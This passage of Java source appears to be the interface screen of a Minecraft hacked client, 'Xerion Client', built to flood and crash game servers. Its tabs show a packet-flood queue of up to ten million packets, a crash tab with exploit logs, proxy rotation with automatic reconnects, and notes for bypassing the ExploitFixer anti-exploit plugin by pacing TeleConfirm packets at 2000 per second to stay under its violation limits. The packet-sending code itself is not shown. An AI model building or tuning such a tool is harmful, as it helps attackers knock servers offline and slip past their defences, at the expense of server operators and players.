        int ogA=(int)(.22f*glow*255);if(ogA>0){ctx.fill(bpx-3,bpy-3,bpx+PW+3,bpy,wa(BORDER,ogA));ctx.fill(bpx-3,bpy+PH,bpx+PW+3,bpy+PH+3,wa(BORDER,ogA));ctx.fill(bpx-3,bpy-3,bpx,bpy+PH+3,wa(BORDER,ogA));ctx.fill(bpx+PW,bpy-3,bpx+PW+3,bpy+PH+3,wa(BORDER,ogA));}
        ctx.fill(bpx,bpy,bpx+PW,bpy+5,borderC);
        ctx.fill(bpx,bpy+PH-5,bpx+PW,bpy+PH,borderC);
        ctx.fill(bpx,bpy,bpx+5,bpy+PH,borderC);
        ctx.fill(bpx+PW-5,bpy,bpx+PW,bpy+PH,borderC);
        // Inner highlight
        int ihA=120;ctx.fill(bpx+5,bpy+5,bpx+PW-5,bpy+6,wa(0xFFEEF8FF,ihA));ctx.fill(bpx+5,bpy+PH-6,bpx+PW-5,bpy+PH-5,wa(0xFFEEF8FF,ihA));ctx.fill(bpx+5,bpy+5,bpx+6,bpy+PH-5,wa(0xFFEEF8FF,ihA));ctx.fill(bpx+PW-6,bpy+5,bpx+PW-5,bpy+PH-5,wa(0xFFEEF8FF,ihA));
        // Gold corners
        drawCorner(ctx,bpx,bpy,bpx+PW,bpy+PH,32,wa(GOLD,(int)(.92f*255)));

        // ── Header title ──────────────────────────────────────────────────
        String hdr="  ❄  X E R I O N   C L I E N T  ❄  ";
        int glA=(int)(50+40*glow+(int)(hypeSmooth*20));
        for(int d=-5;d<=5;d+=2){int ga=Math.max(0,glA-Math.abs(d)*7);if(ga>0)ctx.drawText(textRenderer,hdr,cx-textRenderer.getWidth(hdr)/2+d,bpy+7,(ga<<24)|0x00CCFF,false);}
        ctx.drawText(textRenderer,hdr,cx-textRenderer.getWidth(hdr)/2,bpy+7,wa(0xFFEEF8FF,(int)(220+35*glow)),false);
        String sub="v3.0  ❄  ExploitFixer bypass: AUTO  ❄  Proxy: "+ProxyManager.getCount()+" loaded";
        ctx.drawText(textRenderer,sub,cx-textRenderer.getWidth(sub)/2,bpy+18,wa(CYAN,(int)(155+55*glow)),false);
        ctx.fill(bpx+24,bpy+30,bpx+PW-24,bpy+31,wa(GOLD,130));

        // ── TAB BUTTONS — custom background drawn behind ──────────────────
        int tabW=(PW-12)/NT;
        ctx.fill(bpx,bpy+33,bpx+PW,bpy+34,wa(BORDER2,100));
        for(int i=0;i<NT;i++){
            int tx2=bpx+6+i*(tabW+1), ty2=bpy+4;
            boolean active=(i==tab);
            int tc=TAB_COLOR[i];
            int tga=(int)(tabGlow[i]*255);
            // Background
            ctx.fill(tx2,ty2,tx2+tabW,ty2+26,wa(PANEL2,active?220:140));
            // Bottom accent line
            ctx.fill(tx2,ty2+24,tx2+tabW,ty2+26,wa(tc,active?255:(tga/2)));
            // Top border (active = bold)
            if(active)ctx.fill(tx2,ty2,tx2+tabW,ty2+3,wa(tc,240));
            // Side glow when active
            if(tga>0){ctx.fill(tx2,ty2,tx2+2,ty2+26,wa(tc,tga/2));ctx.fill(tx2+tabW-2,ty2,tx2+tabW,ty2+26,wa(tc,tga/2));}
        }

        // ── Tab content overlays (text / info panels) ─────────────────────
        switch(tab){
            case 0 -> renderInfo(ctx,cx,bpx,bpy);
            case 1 -> renderPackets(ctx,cx,bpx,bpy);
            case 2 -> renderCrash(ctx,cx,bpx,bpy);
        }

        // ── Sidebar ───────────────────────────────────────────────────────
        drawSidebar(ctx,bpx+PW-155,bpy+36,150,PH-36-30);

        // ── Status bar ────────────────────────────────────────────────────
        if(statusTimer>0){
            int sa2=Math.min(255,statusTimer*2);
            ctx.fill(bpx+6,bpy+PH-46,bpx+PW-6,bpy+PH-28,wa(PANEL2,230));
            ctx.fill(bpx+6,bpy+PH-46,bpx+10,bpy+PH-28,wa(GOLD,sa2));
            ctx.fill(bpx+PW-10,bpy+PH-46,bpx+PW-6,bpy+PH-28,wa(GOLD,sa2));
            ctx.drawText(textRenderer,statusText,cx-textRenderer.getWidth(statusText)/2,bpy+PH-40,wa(statusColor&0xFFFFFF,sa2),false);
        }

        // ── Footer ────────────────────────────────────────────────────────
        ctx.fill(bpx,bpy+PH-20,bpx+PW,bpy+PH,wa(PANEL2,200));
        String foot="❄  Sent: "+fmt(totalPackets)+"  |  Queue: "+ProfessorClientMod.PACKET_QUEUE.size()+"  |  Reconnects: "+ProfessorClientMod.getReconnectCount()+"  |  Logs: "+ExploitLogger.size()+"  ❄";
        ctx.drawText(textRenderer,foot,cx-textRenderer.getWidth(foot)/2,bpy+PH-14,wa(DIM,160),false);

        if(numField!=null) numField.render(ctx,mx,my,delta);
        if(proxyField!=null) proxyField.render(ctx,mx,my,delta);
        super.render(ctx,mx,my,delta);
    }

    // ── Tab render overlays ───────────────────────────────────────────────

    private void renderInfo(DrawContext ctx, int cx, int bpx, int bpy){
        int x=bpx+20, y=bpy+36, rw=PW-175;
        // Info rows
        boolean conn=client!=null&&client.getNetworkHandler()!=null;
        String[][] rows={
            {"❄ Client",    "Xerion Client v3.0"},
            {"🌐 Server",   conn?ProfessorClientMod.lastServerHost+":"+ProfessorClientMod.lastServerPort:"Offline"},
            {"🔗 Proxy",    ProxyManager.getCount()+" loaded  |  "+
                (ProxyManager.isEnabled()?"Active #"+ProxyManager.getCurrent():"Disabled")+
                (ProxyManager.isAutoRotate()?" [AUTO]":"")},
            {"⚡ Bypass",   "EF auto: TeleConfirm 0.01VL/pkt → 2000/sec, net 0 VL"},
            {"📊 Packets",  "Sent: "+fmt(totalPackets)+"  |  Queue: "+ProfessorClientMod.PACKET_QUEUE.size()},
            {"♻ Reconnects",String.valueOf(ProfessorClientMod.getReconnectCount())},
            {"📋 Logs",     ExploitLogger.size()+" entries"},
            {"🔥 VL est.",  String.format("%.1f",getVl())+" / 25 (cancel) / 100 (kick)"},
            {"🎵 Music",    ProfessorMusicManager.isPlaying(client)?"Playing":"Stopped"},
        };
        ctx.fill(x,y,x+rw,y+rows.length*16+20,wa(PANEL2,200));
        ctx.fill(x,y,x+rw,y+2,wa(BORDER2,180));
        ctx.drawText(textRenderer,"CLIENT INFORMATION",x+6,y+6,wa(CYAN,220),false);
        ctx.fill(x,y+15,x+rw,y+16,wa(BORDER2,60));
        for(int i=0;i<rows.length;i++){
            ctx.drawText(textRenderer,rows[i][0],x+6,y+19+i*16,wa(ICE,200),false);
            ctx.drawText(textRenderer,rows[i][1],x+rw/3,y+19+i*16,wa(BRIGHT,200),false);
        }
        // VL bar
        int vy=y+rows.length*16+24;
        ctx.fill(x,vy,x+rw,vy+10,wa(PANEL2,220));
        float vlN=getVl();
        int vfw=(int)((rw-4)*Math.min(1f,vlN/100f));
        int vc=vlN>=100?RED:vlN>=25?ORANGE:GREEN;
        if(vfw>0)ctx.fill(x+2,vy+1,x+2+vfw,vy+9,wa(vc,200));
        ctx.drawText(textRenderer,"VL: "+String.format("%.1f",vlN)+"/100",x+4,vy+1,wa(vc,200),false);
        // Proxy list (first few)
        int ply=vy+18;
        var plist=ProxyManager.getAll();
        ctx.drawText(textRenderer,"PROXY LIST:",x+6,ply,wa(ICE,200),false);
        for(int i=0;i<Math.min(plist.size(),6);i++){
            boolean cur=ProxyManager.isEnabled()&&i==ProxyManager.getCurrent();
            ctx.drawText(textRenderer,(cur?"▶ ":"  ")+i+". "+plist.get(i),x+6,ply+12+i*12,wa(cur?GREEN:BRIGHT,180),false);
        }
    }

    private void renderPackets(DrawContext ctx, int cx, int bpx, int bpy){
        int x=bpx+20, y=bpy+36, rw=PW-175;
        // N field label
        ctx.drawText(textRenderer,"Packet count (max 10,000,000):",x,y+10,wa(ICE,200),false);
        // Quick select labels
        ctx.drawText(textRenderer,"Quick:",x,y+44,wa(DIM,180),false);
        // ExploitFixer bypass info panel
        int iy=y+192;
        ctx.fill(x,iy,x+rw,iy+70,wa(PANEL2,220));
        ctx.fill(x,iy,x+rw,iy+2,wa(CYAN,180));
        ctx.drawText(textRenderer,"❄  ExploitFixer AUTO-BYPASS  (always active)",x+6,iy+5,wa(CYAN,220),false);
        ctx.drawText(textRenderer,"TeleConfirm VL=0.01  →  2000/sec  =  reduce rate  →  net 0 VL",x+6,iy+17,wa(GREEN,200),false);
        ctx.drawText(textRenderer,"Cancel@25VL · Kick@100VL · PPS-hard=4096  ·  We use 2000/sec",x+6,iy+29,wa(BRIGHT,170),false);
        ctx.drawText(textRenderer,"Movement  VL=0.2  →  capped 80/sec (100/sec cancel limit)",x+6,iy+41,wa(BRIGHT,170),false);
        ctx.drawText(textRenderer,"Bypass mode: "+BP[bypass]+(bypass==10?" ✅ EF-safe":"  ⚠ manual"),x+6,iy+53,wa(bypass==10?GREEN:ORANGE,200),false);
        // Queue progress bar
        int qy=iy+76;
        int qmax=Math.max(1,ProfessorClientMod.attackN);
        int qleft=ProfessorClientMod.PACKET_QUEUE.size();
        int qdone=Math.max(0,qmax-qleft);
        int qfw=(int)((rw-4)*(float)qdone/qmax);
        ctx.fill(x,qy,x+rw,qy+10,wa(PANEL2,220));
        if(qfw>0)ctx.fill(x+2,qy+1,x+2+qfw,qy+9,wa(qleft>0?CYAN:GREEN,200));
        ctx.drawText(textRenderer,"Queue: "+qleft+" remaining (sent "+(totalPackets)+"/target "+qmax+")",x+4,qy+1,wa(BRIGHT,200),false);
    }

    private void renderCrash(DrawContext ctx, int cx, int bpx, int bpy){
        int x=bpx+20, rw=PW-175;
        // Log panel
        int lx=x, lh=crashLogH;
        ctx.fill(lx,crashLogY,lx+rw,crashLogY+lh,wa(PANEL2,220));
        ctx.fill(lx,crashLogY,lx+rw,crashLogY+2,wa(RED,180));
        ctx.drawText(textRenderer,"EXPLOIT LOGS  ("+ExploitLogger.size()+" entries)",lx+5,crashLogY+4,wa(RED,220),false);
        ctx.fill(lx,crashLogY+14,lx+rw,crashLogY+15,wa(RED,60));

        List<ExploitLogger.LogEntry> logs=ExploitLogger.getAll();
        int lineH=11, linesVisible=(lh-20)/lineH;
        int start=Math.min(logScroll, Math.max(0,logs.size()-linesVisible));
        for(int i=0;i<linesVisible&&start+i<logs.size();i++){
            ExploitLogger.LogEntry e=logs.get(start+i);
            String txt=e.formatted();
            if(txt.length()>74) txt=txt.substring(0,71)+"...";
            ctx.drawText(textRenderer,txt,lx+5,crashLogY+18+i*lineH,wa(e.color(),200),false);
        }
    }

    private void drawSidebar(DrawContext ctx, int x, int y, int w, int h){
        ctx.fill(x,y,x+w,y+h,wa(PANEL2,220));
        ctx.fill(x,y,x+w,y+2,wa(BORDER2,200));ctx.fill(x,y+h-2,x+w,y+h,wa(BORDER2,200));
        ctx.fill(x,y,x+2,y+h,wa(BORDER2,200));ctx.fill(x+w-2,y,x+w,y+h,wa(BORDER2,200));
        ctx.drawText(textRenderer,"❄  LIVE STATS",x+5,y+5,wa(ICE,220),false);
        ctx.fill(x,y+15,x+w,y+16,wa(BORDER2,80));

        float vl2=getVl();
        int vlc=vl2>=100?RED:vl2>=25?ORANGE:GREEN;
        boolean proxy=ProxyManager.isEnabled();
        ProxyManager.ProxyEntry cur=ProxyManager.getCurrentEntry();

        String[] lines={
            "Bypass: "+BP[bypass],
            "Mode: "+(bypass==10?"EXFIX ✅":"MANUAL"),
            "PktsQ: "+ProfessorClientMod.PACKET_QUEUE.size(),
            "Sent: "+fmt(totalPackets),
            "VL: "+String.format("%.1f",vl2),
            "Proxy: "+(proxy?(cur!=null?cur.host():"#"+ProxyManager.getCurrent()):"OFF"),
            "Rotate: "+(ProxyManager.isAutoRotate()?"AUTO":"OFF"),
            "Reconnects: "+ProfessorClientMod.getReconnectCount(),
            "Logs: "+ExploitLogger.size(),
            "Hype: "+(int)(hypeSmooth*100)+"%",
        };
        for(int i=0;i<lines.length;i++){
            int lc=lines[i].startsWith("VL")?vlc:lines[i].startsWith("Proxy")&&proxy?GREEN:BRIGHT;
            ctx.drawText(textRenderer,lines[i],x+5,y+20+i*13,wa(lc,200),false);
        }

        // VL bar
        int vy=y+h-36;ctx.drawText(textRenderer,"VL",x+5,vy-10,wa(ICE,160),false);
        ctx.fill(x+3,vy,x+w-3,vy+8,wa(BORDER2,50));
        int vfw2=(int)((w-6)*Math.min(1f,vl2/100f));
        if(vfw2>0)ctx.fill(x+3,vy,x+3+vfw2,vy+8,wa(vlc,(int)((0.8f+.2f*glow)*255)));
        // Queue indicator dot
        ctx.fill(x+w-10,y+5,x+w-5,y+10,wa(ProfessorClientMod.PACKET_QUEUE.isEmpty()?GREEN:ORANGE,(int)((0.5f+.5f*glow)*255)));
    }

    @Override public boolean mouseClicked(double mx,double my,int btn){if(btn==0)cs();if(numField!=null)numField.mouseClicked(mx,my,btn);if(proxyField!=null)proxyField.mouseClicked(mx,my,btn);return super.mouseClicked(mx,my,btn);}
    @Override public boolean keyPressed(int k,int sc,int mod){if(numField!=null&&numField.isFocused()&&numField.keyPressed(k,sc,mod))return true;if(proxyField!=null&&proxyField.isFocused()&&proxyField.keyPressed(k,sc,mod))return true;return super.keyPressed(k,sc,mod);}
    @Override public boolean charTyped(char c,int mod){if(numField!=null&&numField.isFocused()&&numField.charTyped(c,mod))return true;if(proxyField!=null&&proxyField.isFocused()&&proxyField.charTyped(c,mod))return true;return super.charTyped(c,mod);}

    private static int wa(int rgb,int a){return(Math.max(0,Math.min(255,a))<<24)|(rgb&0x00FFFFFF);}
    private static void drawCorner(DrawContext ctx,int x1,int y1,int x2,int y2,int cs,int col){ctx.fill(x1,y1,x1+cs,y1+4,col);ctx.fill(x1,y1,x1+4,y1+cs,col);ctx.fill(x2-cs,y1,x2,y1+4,col);ctx.fill(x2-4,y1,x2,y1+cs,col);ctx.fill(x1,y2-4,x1+cs,y2,col);ctx.fill(x1,y2-cs,x1+4,y2,col);ctx.fill(x2-cs,y2-4,x2,y2,col);ctx.fill(x2-4,y2-cs,x2,y2,col);}
}
